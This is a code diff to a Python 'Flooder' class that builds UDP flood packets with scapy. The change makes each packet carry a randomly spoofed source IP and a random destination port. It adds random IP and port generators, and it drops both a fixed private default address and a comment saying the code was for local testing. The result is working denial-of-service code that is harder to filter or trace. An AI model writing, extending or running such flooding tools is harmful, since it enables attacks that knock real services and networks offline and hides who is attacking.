@@ -23,11 +23,11 @@ class Flooder():
             raise ValueError("message must be a string.")
 
         self.target_host = target_host
-        self.target_port = target_port
+        self.target_port = target_port if target_port is not None else self.random_port()  # Use a random port if not specified
         self.thread_count = thread_count
 
         self._default_message = message.encode()
-        self._default_spoofed_ip = "192.168.1.100"
+        self._default_spoofed_ip = self.random_ip().encode()  # Default spoofed IP, can be overridden
 
         self.running: bool = True
         self.packets_sent = 0
@@ -73,18 +73,17 @@ class Flooder():
         
         current_socket.close() # Close the socket after the thread finishes
 
-    def start_spoofed(self, packet_count: int = -1, message: bytes = None, spoofed_ip: str = "192.168.1.100", is_threaded: bool = False):
-        """The spoofed flood method"""
+    def start_spoofed(self, packet_count: int = -1, message: bytes = None, is_threaded: bool = False):
+        """The spoofed flood method, now with per-packet randomization."""
         # Use the provided message or the default one
         message_to_send = message if message is not None else self._default_message
 
         while self.running and (packet_count == -1 or self.packets_sent < packet_count):
-            # Construct the IP layer with a spoofed source IP
-            s_ip = spoofed_ip if spoofed_ip is not None else self._default_spoofed_ip
-            ip_layer = scapy_IP(src=s_ip, dst=self.target_host)
+            # Construct the IP layer with a SPOOFED and RANDOM source IP for EACH packet
+            ip_layer = scapy_IP(src=self.random_ip(), dst=self.target_host)
 
-            # Construct the UDP layer for the target port
-            udp_layer = scapy_UDP(dport=self.target_port)
+            # Construct the UDP layer for a RANDOM target port for EACH packet
+            udp_layer = scapy_UDP(dport=self.random_port())
 
             # Stack the layers and payload together to form the full packet
             packet = ip_layer / udp_layer / message_to_send
@@ -96,9 +95,8 @@ class Flooder():
             with self.packet_lock:
                 self.packets_sent += 1
                 if self.packets_sent % 1000 == 0:
-                    print(f"[+] Sent {self.packets_sent} spoofed packets.")
+                    print(f"[+] Sent {self.packets_sent} spoofed packets to random port.")
 
-            # Again, this is for local testing.
             if not is_threaded:
                 time.sleep(0.00001)
 
@@ -145,6 +143,13 @@ class Flooder():
             if packet_count < 0: # Only call stop again if it was an infinite flood
                 print("[i] Main thread finished.")
 
+    def random_ip(self) -> str:
+        # Generates a random IP address for spoofing purposes.
+        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
+
+    def random_port(self) -> int:
+        # Generates a random port number for spoofing purposes.
+        return random.randint(1, 65535)
 
     def stop(self):
         """Stops the flooder and cleans up resources."""
